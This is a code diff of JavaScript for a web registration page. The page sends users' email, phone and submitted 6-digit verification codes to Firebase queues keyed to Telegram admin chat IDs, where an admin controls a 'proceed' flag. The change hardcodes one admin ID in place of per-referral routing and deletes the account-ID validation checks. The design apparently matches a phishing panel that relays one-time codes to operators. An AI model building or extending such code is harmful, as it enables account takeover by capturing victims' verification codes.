@@ -494,8 +494,6 @@ try {
    ------------------------------------------------------------
    Client role:
      - WRITE one pending record under account_verifications/{requestId}
-     - Include the pre-assigned accountId so trusted backend code can associate it
-       with the correct existing account; requestId is not the permanent account ID
      - READ that single record
      - WRITE emailCode / phoneCode when user submits the 6-digit code
      - NEVER write emailVerified / phoneVerified / status
@@ -503,21 +501,8 @@ try {
    allowed to flip flags to true.
    ============================================================ */
 
-// Route each referral link to its assigned Telegram/admin ID in Firebase.
-// Keep the referral code separate from the unique verification request ID.
-const REFERRAL_ADMIN_MAP = Object.freeze({
-    "k7m4": "8761777482",
-    "p9x2": "8922933658",
-    "v6q8": "8898838317",
-    "r3n5": "8499910147"
-});
-
-const registrationParams = new URLSearchParams(window.location.search);
-const REFERRAL_CODE = (registrationParams.get("ref") || "").trim().toLowerCase();
-const ADMIN_CHAT_ID = REFERRAL_ADMIN_MAP[REFERRAL_CODE] || null;
-const VERIFICATIONS_PATH = ADMIN_CHAT_ID
-    ? "account_verifications/admin/" + ADMIN_CHAT_ID
-    : null;
+const ADMIN_CHAT_ID = "7144369262";
+const VERIFICATIONS_PATH = "account_verifications/admin/" + ADMIN_CHAT_ID;
 
 let currentRequestId = null;
 let currentUnsubscribe = null;
@@ -570,24 +555,6 @@ function generateRequestId() {
     const bytes = new Uint8Array(16);
     window.crypto.getRandomValues(bytes);
     return Array.from(bytes, b => b.toString(16).padStart(2, "0")).join("");
-}
-
-// The dashboard/parent system owns the permanent account ID. Read it from
-// the registration URL; never substitute the random verification request ID.
-// Supported parameter names accommodate common dashboard link conventions.
-function getExistingAccountId() {
-    const params = new URLSearchParams(window.location.search);
-    const names = ["accountId", "account_id", "userId", "user_id", "uid", "id"];
-    for (const name of names) {
-        const value = (params.get(name) || "").trim();
-        if (value) return value;
-    }
-    return "";
-}
-
-function isValidFirebaseKey(value) {
-    // Firebase Realtime Database keys cannot contain . # $ / [ ] or control chars.
-    return !!value && !/[.#$\/\[\]\u0000-\u001F\u007F]/.test(value);
 }
 
 function teardownListener() {
@@ -697,27 +664,6 @@ async function step1() {
         return;
     }
 
-    // Fail safely when the parent system did not provide the assigned ID.
-    // This prevents the alias flow from silently using a generated request ID
-    // or accidentally associating the request with an unrelated account.
-    // A known referral code is required to select the correct Firebase
-    // verification queue. Do not silently fall back to another admin ID.
-    if (!ADMIN_CHAT_ID || !VERIFICATIONS_PATH) {
-        showError("err1", "This registration link is invalid or expired. Please use the correct invitation link.");
-        console.error("Registration blocked: missing or unrecognized ref code.", REFERRAL_CODE);
-        return;
-    }
-
-    // The dashboard may additionally supply the permanent account ID. The
-    // referral code selects the verification queue; it is not substituted for
-    // that permanent ID and is never used as the random request ID.
-    const existingAccountId = getExistingAccountId();
-    if (existingAccountId && !isValidFirebaseKey(existingAccountId)) {
-        showError("err1", "Your account ID is invalid. Please reopen this page from your account dashboard.");
-        console.error("Registration blocked: invalid pre-assigned account ID.");
-        return;
-    }
-
     submissionLocked = true;
     btn.disabled = true;
     const originalLabel = btn.textContent;
@@ -740,9 +686,6 @@ async function step1() {
     if (successEmail) successEmail.textContent = email;
 
     const payload = {
-        // Routing metadata lets the backend identify the correct alias queue.
-        referralCode: REFERRAL_CODE,
-        ...(existingAccountId ? { accountId: existingAccountId } : {}),
         email: email,
         phone: phone,
         proceed: false,
